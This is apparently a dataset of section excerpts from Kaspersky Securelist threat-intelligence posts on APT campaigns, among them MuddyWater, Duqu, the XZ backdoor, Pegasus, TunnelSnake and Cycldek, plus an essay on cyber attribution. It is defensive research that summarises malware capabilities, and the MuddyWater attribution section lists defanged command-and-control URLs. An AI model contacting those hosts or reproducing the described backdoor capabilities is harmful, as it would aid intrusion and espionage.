noted that this happens in other countries as well, not just in the Netherlands). It demonstrates again that it is not so difficult for (APT) groups to breach valuable targets and that basic cyber hygiene is important for everybody. \nAs a final note, one should always be careful about deriving hard conclusions from APT findings, particularly in terms of attribution. For example, even though we saw Olympic Destroyer malware being used to target chemical threat prevention laboratories shortly after the OPWC incident, this is not conclusive evidence that the groups behind these attacks are the same, or even related. However, using this fact to monitor your network for the presence of Olympic Destroyer malware if you think you might be a potential Sofacy target \u2013 and vice versa \u2013 seems like a good approach. \nFor more information on our private threat intelligence reporting service, please contact intelreports@kaspersky.com ", "source": "securelist"}, {"title": "Introduction", "content": "We have been studying the Duqu Trojan for two months now, exploring how it emerged, where it was distributed and how it operates. Despite the large volume of data obtained (most of which has yet to be published), we still lack the answer to the fundamental question \u2013 who is behind Duqu? \nIn addition, there are other issues, mostly to do with the creation of the Trojan, or rather the platform used to implement Duqu as well as Stuxnet. \nIn terms of architecture, the platform used to create Duqu and Stuxnet is the same. This is a driver file which loads a main module designed as an encrypted library. At the same time, there is a separate configuration file for the whole malicious complex and an encrypted block in the system registry that defines the location of the module being loaded and name of the process for injection. \nThis platform can be conventionally named as 'Tilded' as its authors are, for some reason, inclined to use file names which start with \"\\~d\". \nWe believe Duqu and Stuxnet were simultaneous projects supported by the same team of developers. \nSeveral other details have been uncovered which suggest there was possibly at least one further spyware module based on the same platform in 2007-2008, and several other programs whose functionality was unclear between 2008 and 2010. \nThese facts significantly challenge the existing \"official\" history of Stuxnet. We will try to cover them in this publication, but let us first recap the story so far. ", "source": "securelist"}, {"title": "Conclusion", "content": "From the data we have at our disposal, we can say with a fair degree of certainty that the \"Tilded\" platform was created around the end of 2007 or early 2008 before undergoing its most significant changes in summer/autumn 2010. Those changes were sparked by advances in code and the need to avoid detection by antivirus solutions. There were a number of projects involving programs based on the \"Tilded\" platform throughout the period 2007-2011. Stuxnet and Duqu are two of them \u2013 there could have been others, which for now remain unknown. The platform continues to develop, which can only mean one thing \u2013 we're likely to see more modifications in the future. \nYour email address will not be published. Required fields are marked \\* \nVery informative,clear and concise.good read \nRAJA USMAN ALI Posted on January 30, 2015. 11:20 pm \nClears lots of counts and missing links \nReply ", "source": "securelist"}, {"title": "Introduction", "content": "MuddyWater is an APT with a focus on governmental and telco targets in the Middle East (Iraq, Saudi Arabia, Bahrain, Jordan, Turkey and Lebanon) and also a few other countries in nearby regions (Azerbaijan, Pakistan and Afghanistan). \nMuddyWater first surfaced in 2017 and has been active continuously, targeting a large number of organizations. First stage infections and graphical decoys have been described by multiple sources, including in our previous research: \"MuddyWater expands operations\" \nNevertheless, comprehensive details of what happens after the initial infection by MuddyWater have not previously been made publicly available. MuddyWater attackers deploy a variety of tools and techniques, mostly developed by the group itself in Python, C# and PowerShell, to implement their attacks and complete their victim infiltration and data exfiltration. Examples of such tools include multiple download/execute tools and RATs in C# and Python, SSH Python script, multiple Python tools for extraction of credentials, history and more. \nThis report details a collection of tools used by this threat actor on its targets after initial infection. It also details deceptive techniques used to divert investigations once attack tools have been deployed inside victim systems (such as Chinese strings, Russian strings and impersonation of the \"RXR Saudi Arabia\" hacking group). The investigation revealed additional OPSEC mistakes by the attackers, but we are not detailing those here due to ongoing law enforcement investigations. ", "source": "securelist"}, {"title": "Conclusion", "content": "MuddyWater attacks have been expanding in recent years in terms of targets and malware functionality. The attackers seem to be reasonably well-equipped for their goals, with relatively simple and expendable tools to infiltrate victims and exfiltrate data, mostly using Python and PowerShellbased tools. These tools also seem to allow them flexibility to adapt and customize the toolset for victims. \nThis continuous capability to steadily adjust and enhance attacks, adapting well to the changing Middle Eastern geopolitical scene, seems to make this actor a solid adversary that keeps growing. We expect it to keep developing or acquiring additional tools and abilities, possibly including zero-days. Nevertheless, its current OPSEC should be considered poor \u2013 for example, leaving details which could reveal different types of information about them. \nFor more information about the attacks and the indicators of compromise, please contact: ntelreports@kaspersky.com ", "source": "securelist"}, {"title": "Introduction", "content": "Energetic Bear/Crouching Yeti is a widely known APT group active since at least 2010. The group tends to attack different companies with a strong focus on the energy and industrial sectors. Companies attacked by Energetic Bear/Crouching Yeti are geographically distributed worldwide with a more obvious concentration in Europe and the US. In 2016-2017, the number of attacks on companies in Turkey increased significantly. \nThe main tactics of the group include sending phishing emails with malicious documents and infecting various servers. The group uses some of the infected servers for auxiliary purposes - to host tools and logs. Others are deliberately infected to use them in waterhole attacks in order to reach the group's main targets. \nRecent activity of the group against US organizations was discussed in a US-CERT advisory, which linked the actor to the Russian government, as well as an advisory by the UK National Cyber Security Centre. \nThis report by Kaspersky Lab ICS CERT presents information on identified servers that have been infected and used by the group. The report also includes the findings of an analysis of several webservers compromised by the Energetic Bear group during 2016 and in early 2017. ", "source": "securelist"}, {"title": "Victims", "content": "The table below shows the distribution of compromised servers (based on the language of website content and/or the origins of the company renting the server at the time of compromise) by countries, attacked company types and the role of each server in the overall attack scheme. Victims of the threat actor's attacks were not limited to industrial companies. ", "source": "securelist"}, {"title": "Conclusion", "content": "The findings of the analysis of compromised servers and the attackers' activity on these servers are as follows: \n1 With rare exceptions, the group's members get by with publicly available tools. The use of publicly available utilities by the group to conduct its attacks renders the task of attack attribution without any additional group 'markers' very difficult.   \n2 Potentially, any vulnerable server on the internet is of interest to the attackers when they want to establish a foothold in order to develop further attacks against target facilities.   \n3 In most cases that we have observed, the group performed tasks related to searching for vulnerabilities, gaining persistence on various hosts, and stealing authentication data.   \n4 The diversity of victims may indicate the diversity of the attackers' interests.   \n5 It can be assumed with some degree of certainty that the group operates in the interests of or takes orders from customers that are external to it, performing initial data collection, the theft of \nauthentication data and gaining persistence on resources that are suitable for the attack's further development. ", "source": "securelist"}, {"title": "Introduction", "content": "MuddyWater is a relatively new APT that surfaced in 2017. It has focused mainly on governmental targets in Iraq and Saudi Arabia, according to past telemetry. However, the group behind MuddyWater has been known to target other countries in the Middle East, Europe and the US. We recently noticed a large amount of spear phishing documents that appear to be targeting government bodies, military entities, telcos and educational institutions in Jordan, Turkey, Azerbaijan and Pakistan, in addition to the continuous targeting of Iraq and Saudi Arabia, other victims were also detected in Mali, Austria, Russia, Iran and Bahrain.. These new documents have appeared throughout 2018 and escalated from May onwards. The attacks are still ongoing. \nThe new spear-phishing docs used by MuddyWater rely on social engineering to persuade users to enable macros. The attackers rely on a range of compromised hosts to deliver their attacks. In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers' arsenal but also some OPSEC mistakes made by the attackers. \nPrevious related research: \nhttps://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/ ", "source": "securelist"}, {"title": "Attribution", "content": "The deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes. Multiple documents used in the attacks also contain embedded paths from their authors' machines. These paths are embedded by Office under various circumstances, for instance, when somebody adds a binary object (an OLE control, e.g. text box or command button) into a Word document. The paths discovered are: \nLeo, Poopak, Vendetta and Turk are the usernames of those creating the documents or the templates on which they are based. Turk could point to a person of Turkish origin. Poopak is a Persian girl's name or might suggest the authors are not entirely happy with \"Pak\", which could be short for Pakistan. Leo could be one of the attacker's names. We also don't rule out the possibility of false flags, with the attackers using random usernames to confuse researchers. \nIn multiple instances, we have also found Chinese text inside the samples, possibly indicating the reuse of code by the attackers. \n\u65e0\u6cd5\u8fde\u63a5\u5230\u7f51\u5740,\u8bf7\u7b49\u5f85\u9f99\u65e0\u6cd5\u8bbf\u95ee\u672c\u5730\u8ba1\u7b97\u673a\u5bc4\u5b58\u5668\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u8bbf\u95ee\u88ab\u62d2\u7edd\nChinese text found in PowerShell code in multiple samples \nUnable to connect to the URL, please wait for the dragon... Unable to access local computer register Task Scheduler access denied \nTranslation of Chinese text \nWe have also noticed that for some samples, e.g. 5a42a712e3b3cfa1db32d9e3d832f8f1, the PowerShell code had only three CnC URLs, which leads us to believe that most of the CnC URLs in \\$dragon_middle found in other samples could actually be 'noise' to distract researchers or trigger false positives. \nhttp://www.cankayasrc[.]com/style/js/main.php http://ektamservis[.]com/includes/main.php http://gtme[.]ae/font-awesome/css/main.php ", "source": "securelist"}, {"title": "Conclusion", "content": "The MuddyWaters group has carried out a large number of attacks and demonstrated advanced social engineering, in addition to the active development of attacks, infrastructure and the use of new methods and techniques. The attackers are actively improving their toolkit in an effort to minimize their exposure to security products and services. Kaspersky Lab expects these types of attacks to intensify in the near future. \nIn order to protect your company from malware, Kaspersky Lab researchers recommend implementing the following measures: \nEducate generic staff to be able to distinguish malicious behavior like phishing links.   \nEducate information security staff to have full configuration, investigative and hunting abilities.   \nUse a proven corporate-grade security solution in combination with anti-targeted attack solutions capable of detecting attacks by analyzing network anomalies.   \nProvide security staff with access to the latest threat intelligence data, which will arm them with helpful tools for targeted attack prevention and discovery, such as indicators of compromise and YARA rules.   \nMake sure enterprise-grade patch management processes are well established and executed. \nHigh-profile organizations should have elevated levels of cybersecurity, attacks against them are inevitable and are unlikely to ever cease. ", "source": "securelist"}, {"title": "Introduction", "content": "Part 1: XZ backdoor story \u2013 Initial analysis Part 2: Assessing the Y, and How, of the XZ Utils incident (social engineering) \nPart 3: XZ backdoor. Hook analysis \nIn our first article on the XZ backdoor, we analyzed its code from initial infection to the function hooking it performs. As we mentioned then, its initial goal was to successfully hook one of the functions related to RSA key manipulation. In this article, we will focus on the backdoor's behavior inside OpenSSH, specifically OpenSSH portable version 9.7p1 \u2013 the most recent version at this time. \nTo better understand what's going on, we recommend you to read Baeldung's article about SSH authentication methods and JFrog's article about privilege separation in SSH. ", "source": "securelist"}, {"title": "Key findings", "content": "Our analysis revealed the following interesting details about the backdoor's functionality: \nThe attacker set an anti-replay feature to avoid possible capture or hijacking of the backdoor communication.   \n$\\bullet$ The backdoor author used a custom steganography technique in the $\\boldsymbol{\\times86}$ code to hide the public key, a very clever technique to hide the public key.   \n$\\bullet$ The backdoor hides its logs of unauthorized connections to the SSH server by hooking the logging function.   \n$\\bullet$ The backdoor hooks the password authentication function to allow the attacker to use any username/password to log into the infected server without any further checks. It also does the same for public key authentication.   \nIt has remote code execution capabilities that allow the attacker to execute any system command on the infected server. ", "source": "securelist"}, {"title": "Conclusion", "content": "After three posts on this backdoor, we can conclude that it is indeed a highly sophisticated threat with many peculiarities. Several highlights make this threat unique, such as the way the public key information is embedded in the binary code itself, complicating the recovery process, and the meticulous preparation of the operation, which involves a long-running social engineering campaign. \nIt is notable that the group or attacker behind this threat has extensive knowledge of the internals of open-source projects such as SSH and libc, as well as expertise in code/script obfuscation used to start the infection. \nKaspersky products detect malicious objects associated with the attack as HEUR:Trojan.Script.XZ and Trojan.Shell.XZ. In addition, Kaspersky Endpoint Security for Linux detects malicious code in sshd process memory as MEM:Trojan.Linux.XZ (as part of the Critical Areas Scan task). ", "source": "securelist"}, {"title": "Introduction", "content": "In the ever-evolving landscape of mobile security, hunting for malware in the iOS ecosystem is akin to navigating a labyrinth with invisible walls. Imagine having a digital compass that not only guides you through this maze, but also reveals the hidden mechanisms of iOS malware previously shrouded in mystery. This is not a tool \u2013 this is the nature of digital forensic artifacts. In this blog post, we'll explore one particular forensic artifact that stands out for uncovering some of the most elusive malware on iOS devices and shedding more light on the traces left by the sophisticated threats endangering the trusted companions in our pockets. \nIn 2021 and 2022, we had the privilege of working on a few Pegasus malware infections on several iPhone devices. The iPhones were Initially given to us by our partners for general security checks \nbefore we discovered the infections. \nInvestigating such cases can be complicated, costly, or time consuming due to the nature of the iOS ecosystem. As a result, related threats can often go undetected by the general public. To date, the common methods for analyzing an iOS mobile infection are either to examine an encrypted full iOS backup, or to analyze the network traffic of the device in question. Both methods, however, are time consuming or require a high level of expertise, which limits their use. \nThrough our analysis, we discovered that the infections left traces in an unexpected system log, Shutdown.log, which is a system log file available on any mobile iOS device. Since the detection method was consistent across several infections we've analyzed, we thought we would dissect and understand this log file in more detail, as it could be used as another method to detect mobile malware. ", "source": "securelist"}, {"title": "Conclusion", "content": "In conclusion, we've analyzed and confirmed the reliability of detecting a Pegasus malware infection using the Shutdown.log artifact stored in a sysdiag archive. The lightweight nature of this method makes it readily available and accessible. Moreover, this log file can store entries for several years, making it a valuable forensic artifact for analyzing and identifying anomalous log entries. Again, this is not a silver bullet that can detect all malware, and this method relies on the user rebooting the phone as often as possible. \nWe'll continue to analyze the Shutdown.log file in more detail and on different platforms. We expect to be able to create more heuristics from the entries in it. We'd love to hear from you if you have any interesting samples that could contribute to this research. As you have seen in this blog, and can even see in your own sysdiag analysis, the Shutdown.log file does not contain any personal information, so feel free to contact us at intelreports@kaspersky.com if you'd like to contribute. ", "source": "securelist"}, {"title": "Introduction", "content": "Windows rootkits, especially those operating in kernel space, are pieces of malware infamous for their near absolute power in the operating system. Usually deployed as drivers, such implants have high privileges in the system, allowing them to intercept and potentially tamper with core I/O operations conducted by the underlying OS, like reading or writing to files or processing incoming and outgoing network packets. The capability to blend into the fabric of the operating system itself, much like security products do, is the quality that earns rootkits their notoriety for stealth and evasion. \nHaving said that, the successful deployment and execution of a rootkit component in Windows has become a difficult task over the years. With Microsoft's introduction of Driver Signature Enforcement, it has become harder (though not impossible) to load and run new code in kernel space. Even then, other mechanisms such as Kernel Patch Protection (also known as PatchGuard) make it hard to \ntamper with the system, with every change in a core system structure potentially invoking the infamous Blue Screen of Death. ", "source": "securelist"}, {"title": "Conclusion", "content": "The TunnelSnake campaign demonstrates the activity of a sophisticated actor that invests significant resources in designing an evasive toolset and infiltrating networks of high-profile organizations. By leveraging Windows drivers, covert communications channels and proprietary malware, the group behind it maintains a considerable level of stealth. That said, some of its TTPs, like the usage of a commodity webshell and open-source legacy code for loading unsigned drivers, may get detected and in fact were flagged by our product, giving us visibility into the group's operation. \nStill, with activity dating back to at least 2018, the threat actor behind this campaign has shown that it is able to evolve and tailor its toolset to target environments. This indicates the group conducting these attacks may well still be active and retooling for additional operations in the area of interest outlined in this publication, as well as other regions. With that in mind, we continue to track this attacker and look for signs of its reappearance in the wild. Any findings and updates will be made available to customers of our Threat Intelligence Portal. \nFor more information about operation TunnelSnake and the underlying threat actor, contact us at: intelreports@kaspersky.com.   \nTo learn more on reverse engineering and malware analysis from Kaspersky GReAT experts, check out the website https://xtraining.kaspersky.com. ", "source": "securelist"}, {"title": "Introduction", "content": "26 MAR 2020 minute read \nA watering hole was discovered on January 10, 2020 utilizing a full remote iOS exploit chain to deploy a feature-rich implant named LightSpy. The site appears to have been designed to target users in Hong Kong based on the content of the landing page. Since the initial activity, we released two private reports exhaustively detailing spread, exploits, infrastructure and LightSpy implants. ", "source": "securelist"}, {"title": "Conclusion", "content": "This particular framework and infrastructure is an interesting example of an agile approach to developing and deploying surveillance framework in Southeast Asia. This innovative approach is something we have seen before from SpringDragon, and LightSpy targeting geolocation at least falls \nwithin previous regional targeting of SpringDragon/LotusBlossom/Billbug APT, as does infrastructure and \"evora\" backdoor use. ", "source": "securelist"}, {"title": "Introduction", "content": "In late July 2024, we detected a series of ongoing targeted cyberattacks on dozens of computers at Russian government organizations and IT companies. The threat actors infected devices using phishing emails with malicious shortcut attachments. These shortcuts were used to deliver malware that received commands via the Dropbox cloud service. Attackers used this malware to download additional payloads onto infected computers, in particular tools used by the APT31 group and an updated CloudSorcerer backdoor. We dubbed this campaign EastWind. \nBelow are the most interesting facts about the implants used in this campaign: \n$\\bullet$ The malware downloaded by the attackers from Dropbox has been used by APT31 since at least 2021. We named it GrewApacha. \nThe attackers updated the The CloudSorcerer backdoor (described by us in early July 2024) ) after we published our blogpost. It currently uses LiveJournal (a social network popular in Russia) and Quora profiles as initial C2 servers. \nThe attacks additionally deploy a previously unknown implant with a classic backdoor functionality, which we dubbed PlugY. It is loaded via the CloudSorcerer backdoor, and its command set is quite extensive. It supports three different protocols for communicating with C2, and what's more, its code resembles that of the DRBControl backdoor (aka Clambling) which several companies attribute to the APT27 group. ", "source": "securelist"}, {"title": "Conclusion", "content": "In attacks on government organizations, threat actors often use toolkits that implement a wide variety of techniques and tactics. In developing these tools, they go to the greatest lengths possible to hide malicious activity in network traffic. For instance, the attackers behind the EastWind campaign, for instance, used popular network services (GitHub, Dropbox, Quora, LiveJournal and Yandex.Disk) as C2 servers. \nNotably, the EastWind campaign bore traces of malware from two different Chinese-speaking groups: APT27 and APT31. This clearly shows that APT groups very often team up, actively sharing knowledge and tools. To successfully counter such collaborations, we closely monitor the techniques and tactics of APT groups operating around the world. ", "source": "securelist"}, {"title": "Introduction", "content": "While investigating attacks related to a group named Cycldek post 2018, we were able to uncover various pieces of information on its activities that were not known thus far. In this blog post we aim to bridge the knowledge gap on this group and provide a more thorough insight into its latest activities and modus operandi. Here are some key insights that will be described in this publication: \nCycldek (also known as Goblin Panda and Conimes) has been active in the past two years, conducting targeted operations against governments in Southeast Asia. Our analysis shows two distinct patterns of activity, indicating the group consists of two operational entities that are active under a mutual quartermaster. We were able to uncover an extensive toolset for lateral movement and information stealing use in targeted networks, consisting of custom and unreported tools as well as living-off-the-land \nbinaries. \nOne of the newly revealed tools is named USBCulprit and has been found to rely on USB media in order to exfiltrate victim data. This may suggest Cycldek is trying to reach air-gapped networks in victim environments or relies on physical presence for the same purpose. ", "source": "securelist"}, {"title": "Conclusion", "content": "Cycldek is an example of an actor that has broader capability than publicly perceived. While most known descriptions of its activity give the impression of a marginal group with sub-par capabilities, the range of tools and timespan of operations show that the group has an extensive foothold inside the networks of high-profile targets in Southeast Asia. \nFurthermore, our analysis of the implants affiliated to the group give an insight into its organizational structure. As already stated, the similarities and differences in various traits of these pieces of malware indicate that they likely originated from different arms of a single organization. Perhaps it's worth noting that we noted multiple points where such entities didn't work in a well-coordinated manner, for example, infecting machines using the BlueCore implant when they were already infected with RedCore. \nLastly, we believe that such attacks will continue in Southeast Asian countries. The use of different tools to reach air-gapped networks in the same countries and attempts to steal data from them have been witnessed in the past. Our analysis shows this type of activity has not ceased \u2013 it has merely evolved and changed shape, in terms of malware and actors. We continue to track the actor and report on its activity in our Threat Intelligence Portal. \nFor more information about Cycldek operations, contact us at: intelreports@kaspersky.com ", "source": "securelist"}, {"title": "Introduction", "content": "19 DEC 2017 minute read \nAt the end of September, Palo Alto released a report on Unit42 activity where they \u2013 among other things \u2013 talked about PYLOT malware. We have been detecting attacks that have employed the use of this backdoor since at least 2015 and refer to it as Travle. Coincidentally, KL was recently involved in an investigation of a successful attack where Travle was detected, during which we conducted a deep analysis of this malware. So, with this intelligence ready we are sharing our findings in this blog to supplement Palo Alto's research with additional details. ", "source": "securelist"}, {"title": "Conclusion", "content": "The actor or actors responsible for the Travle attack has been active during the last few years, apparently not worried about being tracked by AV companies. Usually, modifications and new additions to their arsenal are discovered and detected quite quickly. Still, the fact that they didn?t really need to change their TTPs during all these years seems to suggest that they don?t need to increase their sophistication level in order to fulfill their goals. What's worse, according to subjects of decoy documents these backdoors are used primarily in the CIS region against government organizations, military entities and companies engaged in high-tech research, which indicates that even high-profile targets still have a long way to go to implement IT-sec best practices which efficiently resist targeted attacks. \nWe detect Travle samples with the following verdicts: \nTrojan.Win32.Tpyn.\\*   \nTrojan.Win32.TravNet.\\*   \nTrojan-Spy.Win32.TravNet.\\*   \nHEUR:Trojan.Win32.Generic   \nHEUR:Trojan.Win32.TravNet.gen   \nHEUR:Backdoor.Win32.NetTraveler.gen ", "source": "securelist"}, {"title": "Introduction", "content": "When reports of a cyberattack appear in the headlines, questions abound regarding who launched it and why. Even if an attacker has what are to it perfectly rational reasons for conducting such an attack, these reasons are often known only to them. The rest of the world, including the victims of the attack, must often engage in some degree of speculation to explain the events and devise ways to protect themselves accordingly. Knowing the technical aspects of an attack may allow victims to build stronger defences, patch gaps and increase their cyber-resilience. This is why both policymakers and industry leaders are usually eager to have this knowledge as a possible 'cure' to mitigate or prevent such cyberattacks from happening again. \nA constant challenge in such an endeavour is that the cyber context, in all its complexity and interconnectedness, remains a dark, unknown forest for many decision-makers. How then can they \nfind out who was behind an attack and why? \nAttribution of a cyberattack is not 'magic'. It is a complex process where technical, legal and political discussions intertwine to produce as complete a narrative as possible \u2013 with as many plausible answers as possible (though not always comprehensive ones). Technical attribution relates to a technical investigation to identify who was behind a cyberattack or cyber operation. Legal attribution assesses if there has been a breach of international law. Finally. political attribution implies the political decision to publicly or privately announce those assessments and tie them to a particular state or private actor. \nSecurity researchers and private cybersecurity companies can typically analyse cyber incidents from a technical standpoint and cluster them into groups, which they then tie to particular threat actors. However, the only actors that deliver the entire narrative of a cyberattack - discussing accountability and international law \u2013 are nation states. The decision-making of states is highly complex in nature, often involving multiple considerations \u2013 from domestic issues to foreign affairs. Publicly attributing cyberattacks, meaning announcing who is thought to be responsible, is therefore often not straightforward, and states might not always be willing to make such announcements.[1] \nWithin this piece, we, a collection of policy scholars and industry experts, discuss how technical attribution \u2013 identifying who is behind a cyberattack \u2013 can become more transparent and better understood by the wider public. Our key discussion points include: How is technical attribution carried out? What are the key challenges in conducting reliable technical attribution? And finally, how can this be more accessible to the multitude of stakeholders who are operating in cyberspace and/or have interests there? \nBelow are our reflections on these questions, divided into several parts. Firstly, we discuss technical attribution and options to make it more transparent and accessible; next we reflect on how, given existing limitations within multilateral initiatives, the international community might make incremental improvements towards ensuring that technicalattribution is made more transparent and more accessible and ensure the stability and security of cyberspace. ", "source": "securelist"}, {"title": "Attribution", "content": "While the idea of cyber attribution \u2013 i.e., determining who is responsible for an attack \u2013 is generally understandable by anyone, its technical underpinnings usually rely on domain-specific knowledge. In almost all cases, with the exception of attribution provided through human intelligence (or HUMINT), it is based on careful analysis of available technical information. The end result of this process is technicalattribution: intelligence that informs readers about the identity of the attackers. But in this specific context, 'identity' should not be understood in the traditional sense: this type of attribution is not aimed at pointing to a door that law enforcement can then kick down. This would in fact require leaps that are usually impossible based on the information available. Instead, the objects crucial to the process of technical attribution are threat actors and attack campaigns. Such 'objects', as referred to here, point to things such as malware and hijacked servers, which, when put together and 'manipulated', inform the technical attribution process. The process produces clusters that represent malicious cyber activity, which can be grouped together based on identifiable characteristics of the attack and previous attacks. \nTechnical attribution may lead the conclusion that, e.g., \"APT 41 is responsible for this attack\", where APT 41 is a term used to consistently designate a specific attacker in the context of different incidents. Figuring out who the people behind APT 41 are would be the prerogative of political, rather than technical, attribution. Technical attribution is only concerned with understanding what characterizes APT 41 as an attacker, and which cyberattacks they are responsible for. But how does this process take place? \nTo understand this, one must first understand what information is used in the technical attribution process and where such information comes from. Taking control of an IT system implies a lot of interaction with it: using vulnerabilities to acquire privileges on the machine, deploying programs to exert control over it, and so on. All these operations affect the target computer or device in very specific ways: files are created, log entries are written, network traffic is generated, and so on. Despite the best efforts of the attackers to leave the smallest possible footprint, it is almost impossible to erase all traces of an attack. The main reason for this is that some of the technical information generated during the interaction is not stored in the compromised machine, or even in the target network (i.e., within network activity logs collected by the Internet Service Provider (ISP), etc.). Below are some examples of the type of data collected and strategies of collection and analysis during the technical attribution process. ", "source": "securelist"}, {"title": "Attribution", "content": "The lack of a global database and the inherent ambiguity of the attribution process imply that cooperation and verifiable procedures are necessary to bolster existing technical attribution efforts. But arguments against global information sharing and transparency in this sphere suggest that a call for such procedures is not a straightforward solution. \nOne key objection in this regard stems from the possibility of attackers gaining access to such a global knowledge pool of information. Attribution reports contain precise indicators (e.g., file hashes, IP addresses, domain names, and so on), which would allow attackers to see which incidents led to their discovery and how defenders tied the activity to them. The immediate consequence of transparent attribution is that it provides resources for attackers to tap into to further hone their methodologies and cover up the most characteristic aspects of their operations. There is therefore arguably value in protecting methods used to track threat actors from interception, even at the expense of wider cooperation. \nA further argument against global information sharing and transparency in technical attribution processes is that disclosing how an attack is attributed also provides information about the capabilities of the defender. Such information might involve trade/industry secrets or even sensitive and/or classified information. Government actors use their signals intelligence (SIGINT) capabilities to provide invaluable data for the cyber attribution process (including politicaland lega) and would rather not attribute an attack publicly at all than have to disclose their SIGINT capabilities and the extent of their visibility. In a limited number of instances, covertly discovering who the attacker is allows analysts to engage in a post-discovery reconstruction of an alternate trail of technical data. By covert means, we refer to signals intelligence, illegal wiretapping and sometimes even plain hacking. But this process \u2013 called 'parallel construction' \u2013 cannot always be performed, sometimes leaving only a choice between unsubstantiated attribution or no attribution at all. ", "source": "securelist"}, {"title": "Attribution", "content": "The lack of consensus amongst states regarding the necessity of technicalattribution and its associated processes remains to be addressed. For example, regarding Norm 13(b), the UN GGE report has noted that \"attribution is a complex undertaking\" and that \"a broad range of factors should be considered before establishing the source of an ICT incident\".[7] While this acknowledges the complexity of attribution (including technical) that practitioners have raised, it leaves various questions unanswered. Given that attribution is complex and involves many factors, what is the \"agreed-upon baseline\" for such technicalattribution to occur? \nBased on documents submitted by states (to both the UN OEWG and UN GGE), it appears that the international community is divided along the lines of whether providing the technical details of ICT incidents (i.e., part of technical attribution) ought to be made compulsory. Some states, such as Russia, have called for legally formalising the need for technical attribution. Others, such as China, while highlighting that states should \"demonstrate genuine, reliable and adequate proof\" when attributing ICT incidents, hold back from making the provision of evidence a mandatory requirement \u2013 note the distinction between use of the term \"states should...\" and \"states must...\". \nAdditionally, paragraph 24 of the GGE report highlighted the need for states who have suffered cyberattacks to \"include the incident's technical attributes...including the incident's bearing on international peace and security; and the results of consultations between the States concerned\". However, there remains much potential for future discussions on the topic (such as at the second iteration of the UN OEWG) to take the discussion further to specify or outline what such technical data collection actually entails, as well as the processes for sharing information and consulting with other concerned states. ", "source": "securelist"}, {"title": "Conclusion", "content": "It is hoped this piece has shed more light on the nuances and caveats of technical attribution, which could be used for further research and analysis by other actors. As no one cybersecurity vendor or any other actor in cyberspace has comprehensive visibility into the threat landscape, closer cooperation among security researchers and cybersecurity companies is necessary for building fact and evidence-based technical attribution as well as public research. Greater dialogue between security researchers, diplomats, and academia is necessary to avoid their 'worlds' existing in silos. Furthermore, technical attribution and its nuances need to be better understood and more accessible for both diplomatic negotiations within the bodies like the UN First Committee (which is responsible for dealing with disarmament and international security matters) and evidence-based academic research (which may also inform the former). \nAn international attribution mechanism could be a solution to greater transparency in, and accessibility of technical attribution in an ideal world. However, the likelihood of this being set up in the near future remains relatively low. The lack of political will of states to tie themselves to formal legal obligations in cyberspace means that an effective information-sharing mechanism resembling that which exists in the Somali piracy context is highly unlikely, at least for the near-term. The UN and International Atomic Energy Agency's nuclear information-sharing mechanisms further point to the institutional limits of any such international body. A more feasible alternative would be the building of technical ad-hoc groups, or various mini-lateral groupings, following the examples of from the nuclear and space policy realm. Such groups, represented by a diverse security research community and academics, could serve as a technical consultative tool for intergovernmental negotiations taking place within various international fora, such as the UN First Committee. Leadership efforts of a few states, coupled with a global recognition of the danger the lack of information sharing mechanisms creates, is therefore urgently required for any such group to be effectively set up. ", "source": "securelist"}, {"title": "Introduction", "content": "31 MAR 2020 minute read \nOn December 4, 2019, we discovered watering hole websites that were compromised to selectively trigger a drive-by download attack with fake Adobe Flash update warnings. This campaign has been active since at least May 2019, and targets an Asian religious and ethnic group. \nThe threat actor's unsophisticated but creative toolset has been evolving a lot since the inception date, may still be in development, and leverages Sojson obfuscation, NSIS installer, Python, opensource code, GitHub distribution, Go language, as well as Google Drive-based C2 channels. \nThe threat actor's operational target is not clear because, unfortunately, we haven't been able to observe many live operations, and we couldn't identify any overlap with known intrusion sets. ", "source": "securelist"}, {"title": "Conclusion", "content": "With almost 10 compromised websites and dozens of implanted hosts (that we know of), the attackers have set up a sizable yet very targeted water-holing attack. The toolset that's being used seems lowbudget and not fully developed, but has been modified several times in a few months to leverage interesting features like Google Drive C2, and would be characteristic of a small, agile team. \nWe were unable to observe any live operations, but some tracks indicate that the Godlike12 backdoor is not widespread, and is probably used to conduct reconnaissance and data-exfiltration operations. \nWe were unable to correlate these attacks to any known APT groups. For more details and the latest information on this threat actor, please contact intelreports@kaspersky.com ", "source": "securelist"}, {"title": "Introduction", "content": "In January 2022, Kaspersky ICS CERT experts detected a wave of targeted attacks on military industrial complex enterprises and public institutions in several countries. In the course of our research, we were able to identify over a dozen of attacked organizations. The attack targeted industrial plants, design bureaus and research institutes, government agencies, ministries and departments in several East European countries (Belarus, Russia, and Ukraine), as well as Afghanistan. \nThe attackers were able to penetrate dozens of enterprises and even hijack the IT infrastructure of some, taking control of systems used to manage security solutions. \nAn analysis of information obtained while investigating the incidents indicates that cyberespionage was the goal of this series of attacks. ", "source": "securelist"}, {"title": "Conclusion", "content": "The findings of our research show that spear phishing remains one of the most relevant threats to industrial enterprises and public institutions. In the course of the attack, the attackers used mostly known backdoor malware, as well as standard lateral movement techniques and methods designed to evade detection by security solutions. \nThe attack series that we have identified is not the first in the campaign. Given that the attackers have had some success, we believe it is highly likely that similar attacks will occur again in the future. Industrial enterprises and public institutions should do a great deal of work to successfully thwart such attacks. \nTechnical details of the attacks, as well as recommendations and indicators of compromise, can be found in the full public version of the article on the Kaspersky ICS CERT website. \nA private version of the article has been published on Kaspersky Threat Intelligence. \nWe are not wrapping up our investigation as yet and will release information on new findings as they appear. For more information, you can contact ics-cert@kaspersky.com. ", "source": "securelist"}, {"title": "Introduction", "content": "Despite our continuous research efforts to detect cyberattacks and enable defense, we often feel that we, as members of a global community, are failing to achieve an adequate level of cybersecurity. \nThis is threatening the proper development and use of information technologies and digital assets, and as a consequence, most of society's current and future activities, from entertainment to democratic processes, including business, healthcare and industrial production. \nWe believe that such a failure can be explained by a lack of global willpower, double-dealing activities, and the lack of global regulations. Here, we develop these hypotheses and outline ideas to advance cybersecurity. ", "source": "securelist"}, {"title": "Conclusion", "content": "We deal with cyberattacks of all kinds every day and monitor their context from various sources. Over the years, we have seen more and more malicious activities from more and more actors, but global cybersecurity has reached a ceiling, and it appears that the potential for cyber-based conflicts is still growing. During the COVID-19 pandemic we have once again observed just how vital information technologies and digital assets are to democracy, the economy, the development of 